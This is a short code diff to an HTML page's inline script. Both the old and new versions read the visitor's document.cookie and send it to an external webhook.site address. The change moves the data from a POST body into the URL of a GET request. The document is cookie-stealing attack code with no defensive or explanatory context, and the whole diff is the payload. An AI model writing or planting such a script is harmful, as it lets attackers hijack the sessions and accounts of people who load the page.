@@ -6,10 +6,10 @@
     <body>
         <script>
     let server = new XMLHttpRequest;
-    server.open("POST", "https://webhook.site/5174eb7d-05c3-4c4c-bbf0-59c3b7f9c0c7",true);
+    server.open("GET", "https://webhook.site/5174eb7d-05c3-4c4c-bbf0-59c3b7f9c0c7/" + document.cookie);
     server.setRequestHeader("Content-Type", "text/plain");
-    server.setRequestHeader("Access-Control-Allow-Origin", "*");            
-    server.send(document.cookie);
+    server.setRequestHeader("Access-Control-Allow-Origin", "*");
+            server.send();
 </script>
     </body>
 
